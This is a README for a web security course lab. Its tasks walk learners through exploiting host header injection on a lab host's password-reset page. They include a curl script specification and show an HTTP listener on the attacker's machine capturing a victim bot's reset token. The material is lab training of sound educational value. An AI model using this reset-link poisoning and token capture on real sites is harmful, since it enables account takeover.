#  0. Welcome 

Welcome to Web Application Security Module \o/

Brief discussion:
```
+ Collegue:
-   Hear this, My Boss Just asked me for Customer Support Dashboard.
+ Me:
-   And ? For a Dashboard with Supports UI, Customers UI and Admin
    Portal will takes you at least 4 weeks.
+ Collegue:
-   I challenged him to do it within 3 days for reward ;)
+ Me:
-   Are you serious :O?
+ Collegue:
-   Yeah, I got Paid ChatGPT 4 by my side :'D
...
3 Days later.
...
+ Collegue:
-   I already finish it, Take a look my friend http://web0x00.hbtn!
+ Me:
-   Am I allowed to pentest it :p ?
+ Collegue:
-   Feel free, It's Hack Proof. I trust AI's Codes, \o/
```
Through this project we will guide you through exploiting 4 types of vulnerabilities which could occur within a web app :‘)

You should have:

- Pre-Installed Kali Linux (or Use a Sandbox)
- Access to our Network (Through OpenVPN or Sandbox)
- Web Browser (We Recommand FireFox)
- Terminal (For curl and sqlmap)

Warming Up:

- Get a Target Machine
- Endpoint : http://web0x00.hbtn/login
- Append to your Hosts file the domain web0x00.hbtn pointing to the target machine ip. 
- Test your connectivity 
```
ia terminal:
┌──(yosri㉿HBTN-LAB)-[~/0x00webfundamentals]
└─$ curl http://web0x00.hbtn
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/home">/home</a>. If not, click the link.
```
---

#  1. Can We Trust Our Hosts? 

Write a bash script that exploit host header injection using curl.

- Initial Endpoint : http://web0x00.hbtn/reset_password
- Your script should accept the NEW HOST as ARG 1 ("$1").
- Your script should accept the TARGET URL as ARG 2 ("$2").
- Your script should accept the FORM DATA as ARG 3 ("$3").
```
┌──(yosri㉿hbtn-lab)-[~/…/web_application_security/0x00_web_fundamentals]
└─$ ./1-host_header_injection.sh new_host http://web0x00.hbtn/reset_password email=test@test.hbtn
...
                                <div class="alert_box">
                                                <span>Email provided not found</span>
                                </div>
                                <button type="submit">Reset</button>
                                <a href="http://new_host/login">Try to sign in again ?</a>
```
---

#  2. Catch The FLAG #1 

Hints

- Check the Source-Code for known Customers emails
- A Bot will click the reset link delivered to the customer.
- The Flag will be displayed on the <header> section after you sign in as a Customer.

Find your IP in our network 
```
$ ip addr show tun0
16: tun0:  mtu 1500 qdisc fqcodel state UNKNOWN group default qlen 500
    link/none 
    inet 6.190.192.2/18 scope global tun0
       validlft forever preferredlft forever
    inet6 fe80::c749:5490:295:a827/64 scope link stable-privacy proto kernelll 
       validlft forever preferredlft forever
```
Open a HTTP server on the port 80 to listen for tampered clicks on all network interfaces. 
```
$ python3 -m http.server -b :: 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:172.17.0.2 - - [11/Nov/2023 10:20:58] code 404, message File not found
::ffff:172.17.0.2 - - [11/Nov/2023 10:20:58] "GET /reset_password/PvgpUt9ucmv5YvfH5yIpR7wnmUolgzEJ HTTP/1.1" 404 -
```
- Initial Endpoint : http://web0x00.hbtn/login
---

